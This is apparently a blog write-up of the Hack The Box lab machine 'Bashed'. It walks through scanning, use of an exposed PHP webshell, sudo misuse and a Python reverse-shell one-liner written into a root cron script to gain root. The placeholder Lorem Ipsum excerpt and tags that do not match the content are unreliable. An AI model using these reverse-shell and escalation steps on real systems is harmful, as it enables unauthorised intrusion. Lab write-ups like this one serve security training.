---
layout: single
title: Bashed - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-02-16
classes: wide
header:
  teaser: /assets/images/htb-writeup-bashed/bashed_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-bashed/bashed_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. [root:/git/htb/bashed]# nmap -Pn -n -sCV 10.10.10.68                                                                              (master✱)
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Arrexel's Development Site

  DIRB:
  ==> DIRECTORY: http://10.10.10.68/css/
  ==> DIRECTORY: http://10.10.10.68/dev/
  ==> DIRECTORY: http://10.10.10.68/fonts/
  ==> DIRECTORY: http://10.10.10.68/images/
  + http://10.10.10.68/index.html (CODE:200|SIZE:7743)
  ==> DIRECTORY: http://10.10.10.68/js/
  ==> DIRECTORY: http://10.10.10.68/php/
  + http://10.10.10.68/server-status (CODE:403|SIZE:299)
  ==> DIRECTORY: http://10.10.10.68/uploads/

  NIKTO:
  + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
  + /config.php: PHP Config file may contain database IDs and passwords.


2. Enumerating the dirb results we quickly find http://10.10.10.68/dev/phpbash.php, a responsive webshell.

    www-data@bashed:/var/www/html/dev# whoami
      www-data

    www-data@bashed:/var/www/html/dev# cat /etc/passwd
      root:x:0:0:root:/root:/bin/bash
      daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
      bin:x:2:2:bin:/bin:/usr/sbin/nologin
      sys:x:3:3:sys:/dev:/usr/sbin/nologin
      sync:x:4:65534:sync:/bin:/bin/sync
      games:x:5:60:games:/usr/games:/usr/sbin/nologin
      man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
      lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
      mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
      news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
      uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
      proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
      www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
      backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
      list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
      irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
      gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
      nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
      systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
      systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
      systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
      systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
      syslog:x:104:108::/home/syslog:/bin/false
      _apt:x:105:65534::/nonexistent:/bin/false
      messagebus:x:106:110::/var/run/dbus:/bin/false
      uuidd:x:107:111::/run/uuidd:/bin/false
      arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash
      scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash

    www-data@bashed:/home/arrexel# cat user.txt
      2c281f318555dbc1b856957c7147bfc1


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Investigate if we can run anything as root.

    www-data@bashed:/home# sudo -l

      Matching Defaults entries for www-data on bashed:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

      User www-data may run the following commands on bashed:
      (scriptmanager : scriptmanager) NOPASSWD: ALL


    www-data@bashed:/# sudo -u scriptmanager ls -al /scripts
      total 16
      drwxrwxr-- 2 scriptmanager scriptmanager 4096 Dec 4 2017 .
      drwxr-xr-x 23 root root 4096 Dec 4 2017 ..
      -rw-r--r-- 1 scriptmanager scriptmanager 58 Dec 4 2017 test.py
      -rw-r--r-- 1 root root 12 Feb 23 05:22 test.txt

    www-data@bashed:/# sudo -u scriptmanager cat /scripts/test.py
      f = open("test.txt", "w")
      f.write("testing 123!")
      f.close

    www-data@bashed:/# sudo -u scriptmanager cat /scripts/test.txt
      testing 123!


2. As we can see from the ls-output above, test.txt is owned by root, maybe the script test.py is ran as root by a cronjob?
   Modify the script with a python one-liner, setup a local listener and wait.

   www-data@bashed:/# sudo -u scriptmanager echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",4499));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > test.py
   [root:/git/htb/bashed]# nc -lvnp 4499                                                                                             (master✱)
    listening on [any] 4499 ...
    connect to [10.10.14.10] from (UNKNOWN) [10.10.10.68] 40690
    /bin/sh: 0: can't access tty; job control turned off
    # whoami
      root
    # cat /root/root.txt
      cc4f0afe3a1026d402ba10329674a8e2


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
